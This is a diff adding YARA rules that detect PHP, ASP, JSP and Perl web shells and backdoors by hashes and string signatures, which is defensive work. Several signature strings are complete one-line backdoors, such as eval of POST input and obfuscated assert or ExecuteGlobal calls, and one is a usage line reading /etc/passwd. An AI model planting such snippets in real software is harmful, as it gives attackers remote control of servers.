+		hash5 = "f98d2b33cd777e160d1489afed96de39"
+		hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
+		hash7 = "e9a5280f77537e23da2545306f6a19ad"
+	strings:
+		$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
+		$s2 = " KB </td>" fullword
+		$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
+		$s4 = "<!-- <tr align=\"center\"> " fullword
+	condition:
+		all of them
+}
+
+rule webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY {
+	meta:
+		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
+		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
+		hash2 = "40a1f840111996ff7200d18968e42cfe"
+		hash3 = "0712e3dc262b4e1f98ed25760b206836"
+	strings:
+		$s4 = "http://www.4ngel.net" fullword
+		$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
+		$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
+		$s9 = "Codz by Angel" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_c99_locus7s_c99_w4cking_xxx {
+	meta:
+		description = "Web Shell - from files c99_locus7s.php, c99_w4cking.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, acid.php, newsh.php, r57.php, Backdoor.PHP.Agent.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
+		hash1 = "9c34adbc8fd8d908cbb341734830f971"
+		hash2 = "ef43fef943e9df90ddb6257950b3538f"
+		hash3 = "ae025c886fbe7f9ed159f49593674832"
+		hash4 = "911195a9b7c010f61b66439d9048f400"
+		hash5 = "697dae78c040150daff7db751fc0c03c"
+		hash6 = "513b7be8bd0595c377283a7c87b44b2e"
+		hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
+		hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
+		hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
+		hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
+		hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
+		hash12 = "41af6fd253648885c7ad2ed524e0692d"
+		hash13 = "6fcc283470465eed4870bcc3e2d7f14d"
+	strings:
+		$s1 = "$res = @shell_exec($cfe);" fullword
+		$s8 = "$res = @ob_get_contents();" fullword
+		$s9 = "@exec($cfe,$res);" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_browser_201_3_ma_ma2_download {
+	meta:
+		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
+		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
+		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
+		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
+		hash4 = "4b45715fa3fa5473640e17f49ef5513d"
+		hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"
+	strings:
+		$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
+		$s2 = "private static String tempdir = \".\";" fullword
+		$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
+	condition:
+		2 of them
+}
+
+rule webshell_000_403_c5_queryDong_spyjsp2010 {
+	meta:
+		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
+		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
+		hash2 = "8b457934da3821ba58b06a113e0d53d9"
+		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
+		hash4 = "655722eaa6c646437c8ae93daac46ae0"
+	strings:
+		$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
+		$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
+		$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
+		$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_r57shell127_r57_kartal_r57 {
+	meta:
+		description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "ae025c886fbe7f9ed159f49593674832"
+		hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
+		hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
+	strings:
+		$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
+		$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
+		$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
+	condition:
+		2 of them
+}
+
+rule webshell_webshells_new_con2 {
+	meta:
+		description = "Web shells - generated from file con2.asp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "d3584159ab299d546bd77c9654932ae3"
+	strings:
+		$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
+		$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
+	condition:
+		1 of them
+}
+
+rule webshell_webshells_new_make2 {
+	meta:
+		description = "Web shells - generated from file make2.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		hash = "9af195491101e0816a263c106e4c145e"
+		score = 50
+	strings:
+		$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
+	condition:
+		all of them
+}
+
+rule webshell_webshells_new_aaa {
+	meta:
+		description = "Web shells - generated from file aaa.asp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "68483788ab171a155db5266310c852b2"
+	strings:
+		$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
+		$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
+		$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
+	condition:
+		1 of them
+}
+
+rule webshell_Expdoor_com_ASP {
+	meta:
+		description = "Web shells - generated from file Expdoor.com ASP.asp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "caef01bb8906d909f24d1fa109ea18a7"
+	strings:
+		$s4 = "\">www.Expdoor.com</a>" fullword
+		$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
+		$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
+		$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
+		$s16 = "<TITLE>Expdoor.com ASP" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_webshells_new_php2 {
+	meta:
+		description = "Web shells - generated from file php2.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "fbf2e76e6f897f6f42b896c855069276"
+	strings:
+		$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
+	condition:
+		all of them
+}
+
+rule webshell_bypass_iisuser_p {
+	meta:
+		description = "Web shells - generated from file bypass-iisuser-p.asp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "924d294400a64fa888a79316fb3ccd90"
+	strings:
+		$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
+	condition:
+		all of them
+}
+
+rule webshell_sig_404super {
+	meta:
+		description = "Web shells - generated from file 404super.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "7ed63176226f83d36dce47ce82507b28"
+	strings:
+		$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
+		$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
+		$s7 = "//http://require.duapp.com/session.php" fullword
+		$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
+		$s12 = "//define('pass','123456');" fullword
+		$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
+	condition:
+		1 of them
+}
+
+rule webshell_webshell_123 {
+	meta:
+		description = "Web shells - generated from file webshell-123.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "2782bb170acaed3829ea9a04f0ac7218"
+	strings:
+		$s0 = "// Web Shell!!" fullword
+		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
+		$s3 = "$default_charset = \"UTF-8\";" fullword
+		$s4 = "// url:http://www.weigongkai.com/shell/" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_webshells_new_pHp {
+	meta:
+		description = "Web shells - generated from file pHp.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "b0e842bdf83396c3ef8c71ff94e64167"
+	strings:
+		$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
+		$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
+		$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
+		$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
+		$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
+	condition:
+		1 of them
+}
+
+rule webshell_webshells_new_code {
+	meta:
+		description = "Web shells - generated from file code.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "a444014c134ff24c0be5a05c02b81a79"
+	strings:
+		$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
+		$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
+		$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
+		$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
+		$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
+	condition:
+		1 of them
+}
+
+rule webshell_webshells_new_jspyyy {
+	meta:
+		description = "Web shells - generated from file jspyyy.jsp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
+	strings:
+		$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
+	condition:
+		all of them
+}
+
+rule webshell_webshells_new_xxxx {
+	meta:
+		description = "Web shells - generated from file xxxx.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "5bcba70b2137375225d8eedcde2c0ebb"
+	strings:
+		$s0 = "<?php eval($_POST[1]);?>  " fullword
+	condition:
+		all of them
+}
+
+rule webshell_webshells_new_JJjsp3 {
+	meta:
+		description = "Web shells - generated from file JJjsp3.jsp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "949ffee1e07a1269df7c69b9722d293e"
+	strings:
+		$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
+	condition:
+		all of them
+}
+
+rule webshell_webshells_new_PHP1 {
+	meta:
+		description = "Web shells - generated from file PHP1.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
+	strings:
+		$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
+		$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
+		$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
+	condition:
+		1 of them
+}
+
+rule webshell_webshells_new_JJJsp2 {
+	meta:
+		description = "Web shells - generated from file JJJsp2.jsp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "5a9fec45236768069c99f0bfd566d754"
+	strings:
+		$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
+		$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
+		$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
+		$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
+	condition:
+		1 of them
+}
+
+rule webshell_webshells_new_radhat {
+	meta:
+		description = "Web shells - generated from file radhat.asp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "72cb5ef226834ed791144abaa0acdfd4"
+	strings:
+		$s1 = "sod=Array(\"D\",\"7\",\"S"
+	condition:
+		all of them
+}
+
+rule webshell_webshells_new_asp1 {
+	meta:
+		description = "Web shells - generated from file asp1.asp"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "b63e708cd58ae1ec85cf784060b69cad"
+	strings:
+		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
+		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_webshells_new_php6 {
+	meta:
+		description = "Web shells - generated from file php6.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "ea75280224a735f1e445d244acdfeb7b"
+	strings:
+		$s1 = "array_map(\"asx73ert\",(ar"
+		$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
+		$s4 = "shell.php?qid=zxexp  " fullword
+	condition:
+		1 of them
+}
+
+rule webshell_webshells_new_xxx {
+	meta:
+		description = "Web shells - generated from file xxx.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "0e71428fe68b39b70adb6aeedf260ca0"
+	strings:
+		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_GetPostpHp {
+	meta:
+		description = "Web shells - generated from file GetPostpHp.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "20ede5b8182d952728d594e6f2bb5c76"
+	strings:
+		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_webshells_new_php5 {
+	meta:
+		description = "Web shells - generated from file php5.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "cf2ab009cbd2576a806bfefb74906fdf"
+	strings:
+		$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
+	condition:
+		all of them
+}
+
+rule webshell_webshells_new_PHP {
+	meta:
+		description = "Web shells - generated from file PHP.php"
+		author = "Florian Roth"
+		date = "2014/03/28"
+		score = 70
+		hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"
+	strings:
+		$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
+		$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
+		$s5 = " - ExpDoor.com</title>" fullword
+		$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
+		$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
+	condition:
+		1 of them
+}
+
+rule perlbot_pl {
+	meta:
+		description = "Semi-Auto-generated  - file perlbot.pl.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
+	strings:
+		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
+		$s1 = "#Acesso a Shel - 1 ON 0 OFF"
+	condition:
+		1 of them
+}
+
+rule Nshell__1__php_php {
+	meta:
+		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "973fc89694097a41e684b43a21b1b099"
+	strings:
+		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
+		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
+	condition:
+		1 of them
+}
+
+rule shellbot_pl {
+	meta:
+		description = "Semi-Auto-generated  - file shellbot.pl.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
+	strings:
+		$s0 = "ShellBOT"
+		$s1 = "PacktsGr0up"
+		$s2 = "CoRpOrAtIoN"
+		$s3 = "# Servidor de irc que vai ser usado "
+		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"
+	condition:
+		2 of them
+}
+
+rule fuckphpshell_php {
+	meta:
+		description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "554e50c1265bb0934fcc8247ec3b9052"
+	strings:
+		$s0 = "$succ = \"Warning! "
+		$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
+		$s2 = "\\*=-- MEMBERS AREA --=*/"
+		$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
+	condition:
+		2 of them
+}
+
+rule ngh_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file ngh.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
+	strings:
+		$s0 = "Cr4sh_aka_RKL"
+		$s1 = "NGH edition"
+		$s2 = "/* connectback-backdoor on perl"
+		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
+		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
+	condition:
+		1 of them
+}
+
+rule jsp_reverse_jsp {
+	meta:
+		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "8b0e6779f25a17f0ffb3df14122ba594"
+	strings:
+		$s0 = "// backdoor.jsp"
+		$s1 = "JSP Backdoor Reverse Shell"
+		$s2 = "http://michaeldaw.org"
+	condition:
+		2 of them
+}
+
+rule wh_bindshell_py {
+	meta:
+		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "fab20902862736e24aaae275af5e049c"
+	strings:
+		$s0 = "#Use: python wh_bindshell.py [port] [password]"
+		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
+		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword
+	condition:
+		1 of them
+}
+
+rule lurm_safemod_on_cgi {
+	meta:
+		description = "Semi-Auto-generated  - file lurm_safemod_on.cgi.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "5ea4f901ce1abdf20870c214b3231db3"
+	strings:
+		$s0 = "Network security team :: CGI Shell" fullword
+		$s1 = "#########################<<KONEC>>#####################################" fullword
+		$s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
+	condition:
+		1 of them
+}
+
+rule c99madshell_v2_0_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "d27292895da9afa5b60b9d3014f39294"
+	strings:
+		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"
+	condition:
+		all of them
+}
+
+rule backupsql_php_often_with_c99shell {
+	meta:
+		description = "Semi-Auto-generated  - file backupsql.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "ab1a06ab1a1fe94e3f3b7f80eedbc12f"
+	strings:
+		$s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
+		$s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
+	condition:
+		all of them
+}
+
+rule w3d_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file w3d.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "987f66b29bfb209a0b4f097f84f57c3b"
+	strings:
+		$s0 = "W3D Shell"
+		$s1 = "By: Warpboy"
+		$s2 = "No Query Executed"
+	condition:
+		2 of them
+}
+
+rule WebShell_cgi {
+	meta:
+		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
+	strings:
+		$s0 = "WebShell.cgi"
+		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"
+	condition:
+		all of them
+}
+
+rule WinX_Shell_html {
+	meta:
+		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "17ab5086aef89d4951fe9b7c7a561dda"
+	strings:
+		$s0 = "WinX Shell"
+		$s1 = "Created by greenwood from n57"
+		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"
+	condition:
+		2 of them
+}
+
+rule csh_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file csh.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
+	strings:
+		$s0 = ".::[c0derz]::. web-shell"
+		$s1 = "http://c0derz.org.ua"
+		$s2 = "vint21h@c0derz.org.ua"
+		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"
+	condition:
+		1 of them
+}
+
+rule pHpINJ_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "d7a4b0df45d34888d5a09f745e85733f"
+	strings:
+		$s1 = "News Remote PHP Shell Injection"
+		$s3 = "Php Shell <br />" fullword
+		$s4 = "<input type = \"text\" name = \"url\" value = \""
+	condition:
+		2 of them
+}
+
+rule ak74shell_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file ak74shell.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "7f83adcb4c1111653d30c6427a94f66f"
+	strings:
+		$s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
+		$s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
+		$s3 = "$xshell"
+	condition:
+		2 of them
+}
+
+rule STNC_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file STNC.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
+	strings:
+		$s0 = "drmist.ru" fullword
+		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
+		$s2 = "STNC WebShell"
+		$s3 = "http://www.security-teams.net/index.php?showtopic="
+	condition:
+		1 of them
+}
+
+rule CmdAsp_asp {
+	meta:
+		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "64f24f09ec6efaa904e2492dffc518b9"
+	strings:
+		$s0 = "CmdAsp.asp"
+		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
+		$s2 = "-- Use a poor man's pipe ... a temp file --"
+		$s3 = "maceo @ dogmile.com"
+	condition:
+		2 of them
+}
+
+rule simple_backdoor_php {
+	meta:
+		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "f091d1b9274c881f8e41b2f96e6b9936"
+	strings:
+		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
+		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
+		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
+	condition:
+		2 of them
+}
+
+rule mysql_shell_php {
+	meta:
+		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "d42aec2891214cace99b3eb9f3e21a63"
+	strings:
+		$s0 = "SooMin Kim"
+		$s1 = "smkim@popeye.snu.ac.kr"
+		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"
+	condition:
+		1 of them
+}
+
+rule Dive_Shell_1_0___Emperor_Hacking_Team_php {
+	meta:
+		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "1b5102bdc41a7bc439eea8f0010310a5"
+	strings:
+		$s0 = "Emperor Hacking TEAM"
+		$s1 = "Simshell" fullword
+		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
+		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"
+	condition:
+		2 of them
+}
+
+rule Asmodeus_v0_1_pl {
+	meta:
+		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "0978b672db0657103c79505df69cb4bb"
+	strings:
+		$s0 = "[url=http://www.governmentsecurity.org"
+		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
+		$s2 = "print \"Asmodeus Perl Remote Shell"
+		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
+	condition:
+		2 of them
+}
+
+rule backup_php_often_with_c99shell {
+	meta:
+		description = "Semi-Auto-generated  - file backup.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "aeee3bae226ad57baf4be8745c3f6094"
+	strings:
+		$s0 = "#phpMyAdmin MySQL-Dump" fullword
+		$s2 = ";db_connect();header('Content-Type: application/octetstr"
+		$s4 = "$data .= \"#Database: $database" fullword
+	condition:
+		all of them
+}
+
+rule phpshell17_php {
+	meta:
+		description = "Semi-Auto-generated  - file phpshell17.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
+	strings:
+		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
+		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
+		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
+	condition:
+		1 of them
+}
+
+rule myshell_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file myshell.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "62783d1db52d05b1b6ae2403a7044490"
+	strings:
+		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
+		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
+		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"
+	condition:
+		2 of them
+}
+
+rule webshell_php {
+	meta:
+		description = "Semi-Auto-generated  - file webshell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "e425241b928e992bde43dd65180a4894"
+	strings:
+		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
+		$s3 = "PHP Web Shell"
+	condition:
+		all of them
+}
+
+rule rootshell_php {
+	meta:
+		description = "Semi-Auto-generated  - file rootshell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "265f3319075536030e59ba2f9ef3eac6"
+	strings:
+		$s0 = "shells.dl.am"
+		$s1 = "This server has been infected by $owner"
+		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
+		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"
+	condition:
+		2 of them
+}
+
+rule shells_PHP_wso {
+	meta:
+		description = "Semi-Auto-generated  - file wso.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "33e2891c13b78328da9062fbfcf898b6"
+	strings:
